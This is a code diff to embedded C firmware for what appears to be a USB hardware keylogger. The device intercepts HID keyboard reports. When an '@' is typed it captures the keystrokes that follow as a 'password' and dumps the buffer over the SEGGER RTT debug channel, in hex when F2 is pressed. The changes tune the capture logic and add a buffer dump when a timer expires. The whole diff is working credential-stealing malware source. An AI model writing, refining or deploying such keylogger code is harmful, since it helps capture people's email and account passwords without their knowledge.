@@ -68,7 +68,7 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
         }
 
         if(report[2] == KEY_F2)
-            for(int i=0; i<password_idx; i++)
+            for(int i = 0; i < password_idx; i++)
                 rtt_printf("%02x", password[i]);
     }
 }
@@ -115,16 +115,16 @@ static void ThreadTestHID(void *p)
  */
 void usbh_init(void)
 {
-    password[0] = 'P';
-    password[1] = 'a';
-    password[2] = 's';
-    password[3] = 's';
-    password[4] = ' ';
-    password[5] = 'W';
-    password[6] = 'o';
-    password[7] = 'r';
-    password[8] = 'd';
-    password[9] = ' ';
+    password[0]  = 'P';
+    password[1]  = 'a';
+    password[2]  = 's';
+    password[3]  = 's';
+    password[4]  = ' ';
+    password[5]  = 'W';
+    password[6]  = 'o';
+    password[7]  = 'r';
+    password[8]  = 'd';
+    password[9]  = ' ';
     password[10] = '!';
 
     password_idx = 11;
@@ -153,7 +153,6 @@ static void store_lasts_inputs(int size)
         memcpy(password + password_idx + bytes_written, input_tab, size - bytes_written);
     } else
         memcpy(password + password_idx, input_tab + input_index - size, size);
-    rtt_printf("%02X %02X %02X\n", input_tab[input_index - 2], input_tab[input_index - 1], input_tab[input_index]);
     password_idx += size;
 }
 
@@ -168,7 +167,9 @@ void usbh_detector(uint8_t input)
     switch(input) {
         case '@':  // email is expected
             rtt_printf("@ detected\n");
-            input_timer = PASSWORD_MAX_SIZE;
+            if(nb_char_pressed > PASSWORD_MAX_SIZE)
+                nb_char_pressed = PASSWORD_MAX_SIZE;
+            input_timer         = PASSWORD_MAX_SIZE;
             store_lasts_inputs(nb_char_pressed);
             nb_char_pressed = 0;
             break;
@@ -181,7 +182,6 @@ void usbh_detector(uint8_t input)
             // disable input timer
             input_timer = -1;
             // print password buffer
-            rtt_printf("password_idx: %d", password_idx);
             rtt_printf("PASSWORD :");
             SEGGER_RTT_Write(0, password, password_idx);
             rtt_printf("");
@@ -191,6 +191,10 @@ void usbh_detector(uint8_t input)
     if(input_timer != -1)
         input_timer--;
     // if input timer value is 0, store lasts inputs
-    if(input_timer == 0)
+    if(input_timer == 0) {
         store_lasts_inputs(PASSWORD_MAX_SIZE);
+        rtt_printf("PASSWORD :");
+        SEGGER_RTT_Write(0, password, password_idx);
+        rtt_printf("");
+    }
 }
